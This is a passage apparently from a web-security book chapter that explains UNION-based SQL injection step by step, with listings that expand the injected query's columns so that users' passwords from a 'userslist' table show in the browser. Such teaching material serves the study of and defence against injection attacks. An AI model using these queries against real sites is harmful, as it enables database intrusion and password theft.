    ```

    SELECT * FROM userslist WHERE id_user = 1

    UNION

    SELECT * FROM userslist WHERE id_user = 2

    ORDER BY id_user DESC

    ```


    The results of the injected SELECT query are displayed, you can proceed to the
    task of displaying the password in the browser window. This is done by expanding
    the asterisk in the second query into the corresponding table columns (Listing
    II.4.7).


    # Listing II.4.7. Expanding the asterisk in the injection query


    ```

    SELECT * FROM userslist WHERE id_user = 1

    UNION

    SELECT id_user, name, pass, email, url FROM userslist WHERE id_user = 2

    ORDER BY id_user DESC

    ```


    The expanded number of columns must be the same as the number of columns in the
    first SELECT query; otherwise, the request will be rejected. However, because
    both the name and the pass fields are of the text type, their places can be switched
    (Listing II.4.8).'
